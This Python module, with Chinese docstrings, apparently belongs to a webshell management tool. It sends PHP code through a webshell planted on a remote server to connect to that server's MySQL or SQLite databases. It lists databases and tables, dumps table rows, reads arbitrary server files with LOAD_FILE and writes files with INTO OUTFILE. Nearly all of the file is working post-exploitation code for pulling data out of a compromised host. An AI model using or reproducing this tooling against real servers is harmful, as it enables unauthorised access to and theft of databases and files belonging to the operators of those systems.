"""
数据库操作模块
支持MySQL、SQLite等数据库
"""
import json
from abc import ABC, abstractmethod
from typing import Any, Dict, List, Optional, Tuple

try:
    from .webshell import PHPWebShell, WebShell
    from .logger import Logger
except ImportError:
    from webshell import PHPWebShell, WebShell
    from logger import Logger


class DatabaseError(Exception):
    """数据库操作异常"""
    pass


class DatabaseOperations(ABC):
    """
    数据库操作抽象基类
    """
    
    def __init__(self, shell: WebShell, logger: Optional[Logger] = None):
        """
        初始化数据库操作
        
        Args:
            shell: WebShell实例
            logger: 日志对象
        """
        self.shell = shell
        self.logger = logger or Logger()
        self._connected = False
    
    @abstractmethod
    def connect(self) -> bool:
        """连接数据库"""
        pass
    
    @abstractmethod
    def query(self, sql: str) -> Tuple[bool, List[Dict[str, Any]]]:
        """
        执行查询
        
        Args:
            sql: SQL查询语句
            
        Returns:
            Tuple[bool, List[Dict]]: (是否成功, 结果列表)
        """
        pass
    
    @abstractmethod
    def execute(self, sql: str) -> Tuple[bool, str]:
        """
        执行SQL语句
        
        Args:
            sql: SQL语句
            
        Returns:
            Tuple[bool, str]: (是否成功, 结果信息)
        """
        pass
    
    @abstractmethod
    def get_tables(self) -> Tuple[bool, List[str]]:
        """获取所有表名"""
        pass
    
    @abstractmethod
    def get_columns(self, table: str) -> Tuple[bool, List[Dict[str, Any]]]:
        """
        获取表的列信息
        
        Args:
            table: 表名
            
        Returns:
            Tuple[bool, List[Dict]]: (是否成功, 列信息列表)
        """
        pass


class MySQLOperations(DatabaseOperations):
    """
    MySQL数据库操作
    """
    
    def __init__(
        self,
        shell: WebShell,
        host: str = 'localhost',
        port: int = 3306,
        username: str = 'root',
        password: str = '',
        database: str = '',
        logger: Optional[Logger] = None
    ):
        """
        初始化MySQL操作
        
        Args:
            shell: WebShell实例
            host: 数据库主机
            port: 端口号
            username: 用户名
            password: 密码
            database: 数据库名
            logger: 日志对象
        """
        super().__init__(shell, logger)
        
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.database = database
    
    def _check_php_shell(self) -> bool:
        """检查是否为PHP Shell"""
        if not isinstance(self.shell, PHPWebShell):
            self.logger.error("MySQL operations require PHP shell")
            return False
        return True
    
    def connect(self) -> bool:
        """测试数据库连接"""
        if not self._check_php_shell():
            return False
        
        php_code = f'''
        $conn = @mysqli_connect("{self.host}", "{self.username}", 
                                "{self.password}", "", {self.port});
        if($conn) {{
            echo "connected";
            mysqli_close($conn);
        }} else {{
            echo "failed";
        }}
        '''
        
        success, result = self.shell.execute_php(php_code)
        
        if success and 'connected' in result:
            self._connected = True
            self.logger.success("Database connected")
            return True
        
        self.logger.error("Database connection failed")
        return False
    
    def query(self, sql: str) -> Tuple[bool, List[Dict[str, Any]]]:
        """执行查询"""
        if not self._check_php_shell():
            return False, []
        
        db_part = f', "{self.database}"' if self.database else ''
        
        php_code = f'''
        $conn = @mysqli_connect("{self.host}", "{self.username}", 
                                "{self.password}"{db_part}, {self.port});
        if(!$conn) {{
            echo json_encode(array("error" => mysqli_connect_error()));
            exit;
        }}
        $result = mysqli_query($conn, "{sql}");
        if(!$result) {{
            echo json_encode(array("error" => mysqli_error($conn)));
            mysqli_close($conn);
            exit;
        }}
        $rows = array();
        while($row = mysqli_fetch_assoc($result)) {{
            $rows[] = $row;
        }}
        echo json_encode($rows);
        mysqli_close($conn);
        '''
        
        success, result = self.shell.execute_php(php_code)
        
        if not success:
            return False, []
        
        try:
            data = json.loads(result)
            if isinstance(data, dict) and 'error' in data:
                self.logger.error(f"Query error: {data['error']}")
                return False, []
            return True, data
        except json.JSONDecodeError:
            return False, []
    
    def execute(self, sql: str) -> Tuple[bool, str]:
        """执行SQL语句"""
        if not self._check_php_shell():
            return False, "PHP shell required"
        
        db_part = f', "{self.database}"' if self.database else ''
        
        php_code = f'''
        $conn = @mysqli_connect("{self.host}", "{self.username}", 
                                "{self.password}"{db_part}, {self.port});
        if(!$conn) {{
            echo "error: " . mysqli_connect_error();
            exit;
        }}
        $result = mysqli_query($conn, "{sql}");
        if($result) {{
            echo "success: " . mysqli_affected_rows($conn) . " rows affected";
        }} else {{
            echo "error: " . mysqli_error($conn);
        }}
        mysqli_close($conn);
        '''
        
        return self.shell.execute_php(php_code)
    
    def get_databases(self) -> Tuple[bool, List[str]]:
        """获取所有数据库"""
        success, result = self.query("SHOW DATABASES")
        
        if not success:
            return False, []
        
        databases = [row.get('Database', '') for row in result]
        return True, databases
    
    def get_tables(self) -> Tuple[bool, List[str]]:
        """获取当前数据库的所有表"""
        success, result = self.query("SHOW TABLES")
        
        if not success or not result:
            return False, []
        
        # 获取第一个key
        key = list(result[0].keys())[0] if result[0] else ''
        tables = [row.get(key, '') for row in result]
        
        return True, tables
    
    def get_columns(self, table: str) -> Tuple[bool, List[Dict[str, Any]]]:
        """获取表的列信息"""
        return self.query(f"DESCRIBE {table}")
    
    def dump_table(
        self,
        table: str,
        limit: int = 100
    ) -> Tuple[bool, List[Dict[str, Any]]]:
        """
        导出表数据
        
        Args:
            table: 表名
            limit: 限制行数
            
        Returns:
            Tuple[bool, List[Dict]]: (是否成功, 数据列表)
        """
        return self.query(f"SELECT * FROM {table} LIMIT {limit}")
    
    def read_file(self, file_path: str) -> Tuple[bool, str]:
        """
        使用MySQL读取文件（需要FILE权限）
        
        Args:
            file_path: 文件路径
            
        Returns:
            Tuple[bool, str]: (是否成功, 文件内容)
        """
        success, result = self.query(f"SELECT LOAD_FILE('{file_path}')")
        
        if not success or not result:
            return False, ""
        
        key = list(result[0].keys())[0] if result[0] else ''
        content = result[0].get(key, '')
        
        return True, content
    
    def write_file(
        self,
        file_path: str,
        content: str
    ) -> Tuple[bool, str]:
        """
        使用MySQL写入文件（需要FILE权限）
        
        Args:
            file_path: 文件路径
            content: 文件内容
            
        Returns:
            Tuple[bool, str]: (是否成功, 结果信息)
        """
        sql = f"SELECT '{content}' INTO OUTFILE '{file_path}'"
        return self.execute(sql)


class SQLiteOperations(DatabaseOperations):
    """
    SQLite数据库操作
    """
    
    def __init__(
        self,
        shell: WebShell,
        db_path: str = '',
        logger: Optional[Logger] = None
    ):
        """
        初始化SQLite操作
        
        Args:
            shell: WebShell实例
            db_path: 数据库文件路径
            logger: 日志对象
        """
        super().__init__(shell, logger)
        self.db_path = db_path
    
    def connect(self) -> bool:
        """SQLite不需要显式连接"""
        self._connected = True
        return True
    
    def query(self, sql: str) -> Tuple[bool, List[Dict[str, Any]]]:
        """执行查询"""
        if not isinstance(self.shell, PHPWebShell):
            return False, []
        
        php_code = f'''
        $db = new SQLite3("{self.db_path}");
        $result = $db->query("{sql}");
        $rows = array();
        while($row = $result->fetchArray(SQLITE3_ASSOC)) {{
            $rows[] = $row;
        }}
        echo json_encode($rows);
        $db->close();
        '''
        
        success, result = self.shell.execute_php(php_code)
        
        if not success:
            return False, []
        
        try:
            data = json.loads(result)
            return True, data
        except json.JSONDecodeError:
            return False, []
    
    def execute(self, sql: str) -> Tuple[bool, str]:
        """执行SQL语句"""
        if not isinstance(self.shell, PHPWebShell):
            return False, "PHP shell required"
        
        php_code = f'''
        $db = new SQLite3("{self.db_path}");
        $result = $db->exec("{sql}");
        if($result) {{
            echo "success";
        }} else {{
            echo "error: " . $db->lastErrorMsg();
        }}
        $db->close();
        '''
        
        return self.shell.execute_php(php_code)
    
    def get_tables(self) -> Tuple[bool, List[str]]:
        """获取所有表名"""
        success, result = self.query(
            "SELECT name FROM sqlite_master WHERE type='table'"
        )
        
        if not success:
            return False, []
        
        tables = [row.get('name', '') for row in result]
        return True, tables
    
    def get_columns(self, table: str) -> Tuple[bool, List[Dict[str, Any]]]:
        """获取表的列信息（SQLite不支持DESCRIBE）"""
        return self.query(f"PRAGMA table_info({table})")


class DatabaseManager:
    """
    数据库管理器
    管理多个数据库连接
    """
    
    def __init__(self, shell: WebShell, logger: Optional[Logger] = None):
        """
        初始化管理器
        
        Args:
            shell: WebShell实例
            logger: 日志对象
        """
        self.shell = shell
        self.logger = logger or Logger()
        self._connections: Dict[str, DatabaseOperations] = {}
    
    @property
    def connections(self) -> Dict[str, DatabaseOperations]:
        """获取所有连接（只读）"""
        return self._connections.copy()
    
    def add_mysql(
        self,
        name: str,
        host: str,
        port: int,
        username: str,
        password: str,
        database: str = ''
    ) -> bool:
        """
        添加MySQL连接
        
        Args:
            name: 连接名称
            host: 主机地址
            port: 端口号
            username: 用户名
            password: 密码
            database: 数据库名
            
        Returns:
            bool: 是否成功
        """
        db = MySQLOperations(
            self.shell, host, port, username, password, database, self.logger
        )
        
        if db.connect():
            self._connections[name] = db
            return True
        
        return False
    
    def add_sqlite(self, name: str, db_path: str) -> bool:
        """
        添加SQLite连接
        
        Args:
            name: 连接名称
            db_path: 数据库文件路径
            
        Returns:
            bool: 是否成功
        """
        db = SQLiteOperations(self.shell, db_path, self.logger)
        self._connections[name] = db
        return True
    
    def get(self, name: str) -> Optional[DatabaseOperations]:
        """
        获取数据库连接
        
        Args:
            name: 连接名称
            
        Returns:
            DatabaseOperations实例或None
        """
        return self._connections.get(name)
    
    def list_connections(self) -> List[str]:
        """列出所有连接名称"""
        return list(self._connections.keys())
    
    def remove(self, name: str) -> bool:
        """
        移除连接
        
        Args:
            name: 连接名称
            
        Returns:
            bool: 是否成功
        """
        if name in self._connections:
            del self._connections[name]
            return True
        return False
